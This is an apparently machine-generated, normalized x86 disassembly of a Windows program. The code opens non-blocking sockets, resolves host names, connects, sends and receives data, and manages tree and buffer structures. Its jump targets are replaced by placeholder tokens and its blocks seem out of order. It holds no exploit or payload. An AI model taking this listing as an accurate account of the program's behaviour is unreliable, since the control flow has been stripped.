lea esp [ esp ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
or eax 0xffffffff
pop ebx
call sub_409fbd
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x10 ]
movzx eax [ edx + 0xa ]
mov ecx [ ebx + 0xc ]
mov edx [ ecx ]
push 0x0
push 0x2
push eax
mov eax [ ebp - 0x1c ]
push edx
push eax
call sub_4066d0
mov edi eax
add esp 0x14
test edi edi
jg r-xdata
push 0x1
mov ecx 0x4e20
lea edx [ ebp - 0x1c ]
call sub_4062f0
add esp 0x4
cmp eax 0x1
jl r-xdata
js r-xdata
cmp edi 0x1
jne r-xdata
je r-xdata
test eax eax
je r-xdata
mov esi [ socket@IAT ]
mov ecx [ ebx + 0xc ]
mov edx [ ecx ]
cmp [ edx ] 0x0
je r-xdata
jns r-xdata
push 0x6
push 0x1
push 0x2
call esi
mov [ ebp - 0x18 ] eax
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x24 ]
push eax
push 0x8004667e
push ecx
mov [ ebp - 0x24 ] 0x1
call [ ioctlsocket@IAT ]
mov edx [ ebx + 0xc ]
mov ebx [ edx ]
mov al [ ebx ]
cmp al 0x1
jne r-xdata
cmp edi 0xffffffff
je r-xdata
cmp al 0x3
jne r-xdata
cmp edi 0x7
jne r-xdata
cmp edi 0x64
jge r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
mov edx [ ecx + 0x1 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax ]
mov cx [ eax + 0x5 ]
mov [ ebp - 0x12 ] cx
jmp r-xdata
mov al [ ebx + 0x1 ]
xor edi edi
test al al
je r-xdata
xor ebx ebx
mov eax 0x2
xor esi esi
mov [ ebp - 0x14 ] ax
cmp [ ebp - 0x10 ] ebx
jbe r-xdata
lea edx [ edi + 0x1 ]
push edx
call sub_40a9c1
add esp 0x4
push edi
add ebx 0x2
mov esi eax
push ebx
push esi
call sub_40edd0
add esp 0xc
push 0x10
mov [ esi + edi ] 0x0
call sub_40a9c1
xor ecx ecx
mov [ eax ] ecx
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
push esi
mov [ eax + 0xc ] ecx
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
movzx edi al
mov eax 0xfffffffe
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_409fbd
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x12 ] bx
jbe r-xdata
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0xc ]
mov ecx [ eax ]
mov dx [ ecx + edi + 0x2 ]
push esi
mov [ ebp - 0x12 ] dx
call sub_409fcc
add esp 0x4
mov eax [ eax + 0xc ]
mov ecx [ eax ]
mov eax [ ecx ]
mov edi [ WSAGetLastError@IAT ]
cmp esi 0x2748
jne r-xdata
call edi
push 0x64
mov esi eax
inc ebx
call [ Sleep@IAT ]
cmp esi 0x2733
je r-xdata
mov edx [ ebp - 0x18 ]
push 0x10
lea ecx [ ebp - 0x14 ]
push ecx
push edx
call [ connect@IAT ]
test eax eax
jns r-xdata
push 0x6
call sub_40a9c1
mov edx [ ebp - 0x20 ]
add esp 0x4
mov esi eax
mov eax [ ebp - 0x10 ]
push 0x0
mov [ esi ] eax
mov cx [ ebp - 0x12 ]
push 0x2
push 0x6
mov [ esi ] cx
mov eax [ edx ]
push esi
push eax
call sub_4068c0
add esp 0x14
push esi
mov ebx eax
call sub_409fcc
add esp 0x4
cmp ebx 0x6
jl r-xdata
cmp ebx 0x3c
jl r-xdata
cmp ebx 0x3c
jge r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_409fbd
mov esp ebp
pop ebp
retn
sub_408d80
push ebp
mov ebp esp
sub esp 0x20
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
push ebx
push edi
xor edi edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] ecx
mov edi edi
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0x8 ]
mov edx [ eax ]
sub edx [ ecx + 0x4 ]
cmp edx [ eax + 0x4 ]
jle r-xdata
mov edx 0x2
mov [ ebp - 0x18 ] dx
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax 0x1
mov [ ebp - 0x10 ] ax
mov edx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
mov ecx [ edx + 0x4 ]
mov edx [ eax ]
sub edx ecx
cmp edx [ eax + 0x4 ]
jle r-xdata
or [ ebp - 0x10 ] 0x2
push 0x2
mov ecx 0x36ee80
lea edx [ ebp - 0x1c ]
call sub_4062f0
add esp 0x4
cmp eax edi
jl r-xdata
cmp ecx edi
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x4 ]
xor edx edx
mov [ ebp - 0x18 ] edx
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp eax 0x1
jl r-xdata
or [ ebp - 0x18 ] 0x1
or eax 0xffffffff
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov bl [ ebp - 0x16 ]
test bl 0x20
je r-xdata
mov al [ ebp - 0xe ]
test al 0x20
je r-xdata
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
test al 0x1
jne r-xdata
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp - 0xe ] 0x2
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edi
push 0x2
sub edx ecx
push edx
add eax ecx
mov ecx [ esi ]
push eax
push ecx
call sub_4068c0
add esp 0x14
cmp eax edi
jl r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edi
sub edx ecx
push edx
add eax ecx
mov ecx [ esi + 0x4 ]
push eax
push ecx
call [ send@IAT ]
cmp eax edi
je r-xdata
mov ecx [ esi + 0x8 ]
add [ ecx + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov edx [ eax + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
push 0x32
call [ Sleep@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx eax
inc eax
mov [ ebp - 0x4 ] eax
cmp ecx 0x64
jle r-xdata
test [ ebp - 0xe ] 0x1
je r-xdata
mov eax [ esi + 0xc ]
cmp [ eax + 0x4 ] edi
jne r-xdata
jl r-xdata
mov [ eax + 0x8 ] edi
mov ecx [ esi + 0x8 ]
mov [ ecx + 0x4 ] edi
mov [ ebp - 0x8 ] 0x1
cmp [ ebp - 0x8 ] edi
jle r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x4 ] edi
je r-xdata
mov edx [ esi + 0x10 ]
mov ecx [ edx ]
mov edx [ eax ]
mov eax [ esi ]
push edi
push 0x5
push ecx
push edx
push eax
call sub_4066d0
add esp 0x14
cmp eax 0x1
jne r-xdata
mov ecx [ esi + 0xc ]
add [ ecx + 0x8 ] eax
mov eax [ esi + 0xc ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x4 ] edi
cmp edx [ eax + 0x4 ]
jne r-xdata
cmp [ ebp - 0xc ] edi
je r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x4 ] edi
jne r-xdata
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x10 ]
mov ecx [ edx ]
sub ecx [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
add edx [ eax ]
mov eax [ esi + 0x4 ]
push edi
push ecx
push edx
push eax
call [ recv@IAT ]
cmp eax edi
je r-xdata
cmp eax edi
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
cmp [ edx ] 0x0
jne r-xdata
mov [ eax + 0x8 ] edi
mov ecx [ esi + 0xc ]
mov [ ecx + 0x4 ] edi
or eax 0xffffffff
pop edi
pop ebx
mov esp ebp
pop ebp
retn
jge r-xdata
jge r-xdata
mov ecx [ esi + 0xc ]
add [ ecx + 0x4 ] eax
mov ecx [ esi + 0x8 ]
add [ ecx + 0x4 ] eax
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
cmp eax 0xfffffffe
je r-xdata
mov [ ebp - 0xc ] 0x1
sub_408fe0
push esi
mov esi eax
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax edi
call sub_409180
sub esi ecx
sar esi 0x1
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x2
pop esi
retn
mov cx [ esi ]
mov [ eax ] cx
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax edi
call sub_409180
mov ecx [ edi ]
mov dx [ ecx + esi * 2 ]
mov [ eax ] dx
add [ edi + 0x4 ] 0x2
pop esi
retn
sub_409040
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
lea eax [ ecx + 0x2 ]
sub edx eax
sar edx 0x1
add edx edx
push edx
push eax
push ecx
call sub_40a5a0
mov eax [ ebp + 0x8 ]
add esp 0xc
add [ esi + 0x4 ] 0xfffffffe
mov [ edi ] eax
mov eax edi
pop ebp
retn 0x4
sub_409070
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_4091e0
mov esi [ esi ]
push ebx
call sub_40a0eb
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_4090c0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi eax
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov ebx ecx
jne r-xdata
cmp ebx [ esi + 0x4 ]
je r-xdata
mov ecx [ edx ]
jmp r-xdata
mov ecx [ edx ]
lea edi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call sub_409e70
push ebx
lea edi [ ebp - 0x4 ]
mov ecx esi
call sub_409a00
mov eax [ ebp - 0x4 ]
add eax 0x10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edx ]
cmp eax [ ebx + 0xc ]
jge r-xdata
cmp [ eax + 0xc ] ecx
jge r-xdata
pop edi
pop esi
lea eax [ ebx + 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_409140
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0xc ]
call sub_409450
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov esi [ ecx ]
xor esi esi
jmp r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ edx + ecx * 4 ]
lea eax [ ecx + eax * 4 ]
pop esi
mov esp ebp
pop ebp
retn
sub ecx edx
mov eax [ eax + 0x8 ]
mov edx [ esi + 0x8 ]
mov ecx eax
shr ecx 0x2
and eax 0x3
cmp edx ecx
ja r-xdata
sub_409180
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x1
cmp eax 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x1
cmp eax ecx
jbe r-xdata
push r--data
call sub_409ef7
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x7fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_409340
mov ecx eax
cmp ecx eax
jae r-xdata
sub_4091e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_4091e0
mov esi [ esi ]
push edi
call sub_40a0eb
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
sub_409220
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0xc ]
add ecx eax
push edi
test cl 0x3
jne r-xdata
mov edi [ ebx + 0xc ]
add edi [ ebx + 0x10 ]
mov eax [ ebx + 0x8 ]
push esi
mov esi edi
shr esi 0x2
cmp eax esi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ ebx + 0x8 ] eax
ja r-xdata
mov edx [ ebx + 0x4 ]
cmp [ edx + esi * 4 ] 0x0
jne r-xdata
sub esi eax
call sub_409470
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + esi * 4 ]
and edi 0x3
lea edi [ edx + edi * 4 ]
pop esi
test edi edi
je r-xdata
push 0x10
call sub_40a3e1
add esp 0x4
test eax eax
je r-xdata
inc [ ebx + 0x10 ]
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edi ] ecx
lea edx [ ebp - 0x4 ]
push edx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_40a4e9
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_40aef3
int3
mov ecx [ ebx + 0x4 ]
mov [ ecx + esi * 4 ] eax
sub_4092d0
mov eax [ esi + 0x10 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
lea ebx [ ebx ]
mov eax [ esi + 0x4 ]
pop edi
cmp eax ebx
je r-xdata
lea ebx [ ebx ]
cmp [ esi + 0x10 ] ebx
jne r-xdata
dec eax
mov [ esi + 0x10 ] eax
jne r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop ebx
retn
push eax
call sub_40a0eb
add esp 0x4
cmp edi ebx
ja r-xdata
mov ecx [ eax ]
push ecx
call sub_40a0eb
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esi + 0xc ] ebx
mov eax [ esi + 0x4 ]
dec edi
cmp [ eax + edi * 4 ] ebx
lea eax [ eax + edi * 4 ]
je r-xdata
sub_409340
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x7fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x1
cmp eax ecx
jae r-xdata
push r--data
call sub_409ef7
pop ebp
retn 0x4
push ebx
push edi
call sub_409600
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x1
add ecx ecx
push ecx
push eax
push ebx
call sub_40a5a0
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x1
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 2 ]
lea eax [ ebx + edx * 2 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_40a0eb
add esp 0x4
sub_4093b0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
call sub_409070
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_409650
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_409470
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebx + 0x8 ]
mov eax 0xfffffff
sub eax ecx
mov [ ebp - 0x8 ] 0x1
cmp eax 0x1
jae r-xdata
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
push r--data
call sub_409ef7
cmp eax 0x1
jbe r-xdata
mov eax 0x8
jmp r-xdata
mov eax [ ebp - 0x8 ]
push esi
push edi
mov edi [ ebx + 0xc ]
xor esi esi
shr edi 0x2
add eax ecx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] esi
cmp eax esi
jbe r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
add eax eax
add eax eax
lea esi [ edi * 4 ]
lea edx [ esi + ecx ]
sub eax edx
add eax ecx
sar eax 0x2
add eax eax
add eax eax
push eax
push edx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ esi + edx ]
push eax
call sub_40a5a0
mov edx [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
cmp edi edx
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
mov [ ebp - 0x8 ] eax
lea edi [ edx * 4 ]
mov edx edi
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call sub_40a5a0
mov eax [ ebx + 0x4 ]
lea ecx [ edi + eax ]
sub esi ecx
add esi eax
mov eax [ ebp - 0x4 ]
sar esi 0x2
add esi esi
add esi esi
push esi
push ecx
push eax
call sub_40a5a0
mov ecx [ ebp - 0x8 ]
add esp 0x18
lea edi [ esi + eax ]
test ecx ecx
je r-xdata
sar esi 0x2
mov [ ebp - 0xc ] esi
mov esi edx
mov edx [ ebp - 0xc ]
add edx edx
add edx edx
push edx
push ecx
push eax
mov [ ebp - 0xc ] edx
call sub_40a5a0
mov edx eax
add edx [ ebp - 0xc ]
add esp 0xc
sub esi edi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] esi
call sub_40a4e9
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_40aef3
int3
lea ecx [ eax * 4 ]
push ecx
call sub_40a3e1
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
mov eax [ ebx + 0x4 ]
pop edi
pop esi
test eax eax
je r-xdata
xor eax eax
[ edi ]
test edi edi
je r-xdata
mov ecx esi
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add [ ebx + 0x8 ] edx
mov [ ebx + 0x4 ] ecx
mov esp ebp
pop ebp
retn
push eax
call sub_40a0eb
add esp 0x4
mov ecx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
sub_409600
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_40a4e9
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_40aef3
lea eax [ ecx + ecx ]
push eax
call sub_40a3e1
add esp 0x4
test eax eax
jne r-xdata
sub_409650
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_409990
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_409f44
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_40a0eb
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_4098b0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_409930
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_4098d0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_409930
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_4098d0
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_4098d0
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_409930
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_4098d0
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_409930
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_409990
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_409a00
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx ecx
cmp [ ebx + 0x8 ] 0x0
push esi
mov esi eax
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
push esi
push 0x1
push edi
